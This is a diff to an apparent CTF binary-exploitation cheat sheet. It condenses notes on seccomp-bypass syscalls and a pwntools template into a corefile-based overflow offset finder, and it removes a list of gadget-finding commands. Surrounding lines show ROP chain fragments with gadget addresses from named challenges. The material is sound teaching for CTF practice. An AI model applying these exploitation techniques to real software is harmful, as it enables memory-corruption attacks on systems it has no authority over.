@@ -82,12 +82,9 @@ payload += bytes(frame)
 
 ## Seccomp Bypass
 
-Alternative syscalls when seccomp blocks `open()`/`read()`:
-- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`
+Alternative syscalls (`openat` 257, `openat2` 437, `sendfile` 40, `readv`/`writev`) and the argument-restriction bypasses are in [advanced.md](advanced.md#seccomp-advanced-techniques).
 
-**Check rules:** `seccomp-tools dump ./binary`
-
-See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.
+---
 
 ## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)
 
@@ -190,45 +187,18 @@ writes = {
 
 ## pwntools Template
 
+`from pwn import *`, `context.binary = elf`, and an `args.REMOTE` switch are boilerplate worth rewriting each time. The part worth remembering is the automatic offset - it skips gdb entirely:
+
 ```python
-from pwn import *
-
-elf = ELF('./binary', checksec=False)
-context.binary = elf
-context.log_level = 'debug'
-
-HOST = args.HOST or 'host'
-PORT = args.PORT or 1337
-
-def conn():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript='init-pwndbg\ncontinue')
-    elif args.REMOTE:
-        return remote(HOST, PORT)
-    return process(elf.path)
-
-io = conn()
-# exploit here
-io.interactive()
+p = process(exe, level='warn')
+p.sendlineafter(b'>', cyclic(500))
+p.wait()
+offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))   # x64: saved RIP sits at rsp
 ```
 
-### Automated Offset Finding via Corefile (Crypto-Cat)
+pwntools writes a corefile from the crash; on x86 read `corefile.pc` instead.
 
-Automatically determine buffer overflow offset without manual `cyclic -l`:
-```python
-def find_offset(exe):
-    p = process(exe, level='warn')
-    p.sendlineafter(b'>', cyclic(500))
-    p.wait()
-    # x64: read saved RIP from stack pointer
-    offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))
-    # x86: use pc directly
-    # offset = cyclic_find(p.corefile.pc)
-    log.warn(f'Offset: {offset}')
-    return offset
-```
-
-**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.
+---
 
 ## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)
 
@@ -793,12 +763,3 @@ chain += flat(pop_rdi_ret, dst, pop_rsi_ret, dst + 0x20, fopen_plt)   # fopen("/
 - The gadget writes to memory: it needs the target dword to be **writable**. Partial RELRO (`BIND_NOW` off) leaves `.got.plt` writable, which is why a GOT retarget works; under **Full RELRO / `BIND_NOW`** the GOT is read-only, so aim the same add at `.fini_array`, a function-pointer table in `.bss`, or another writable dword.
 
 **References:** N1CTF Junior 2026 - Onlyfgets (`solve.py`); CISCN - minihttpd (`exp.py`, magic gadget `0x40169c`, csu pops `0x402fea`, csu call `0x402fd0`, `fopen@plt` at `0x402c87`).
-
-## Useful Commands
-
-```bash
-one_gadget libc.so.6           # Find one-shot gadgets
-ropper -f binary               # Find ROP gadgets
-ROPgadget --binary binary      # Alternative gadget finder
-seccomp-tools dump ./binary    # Check seccomp rules
-```
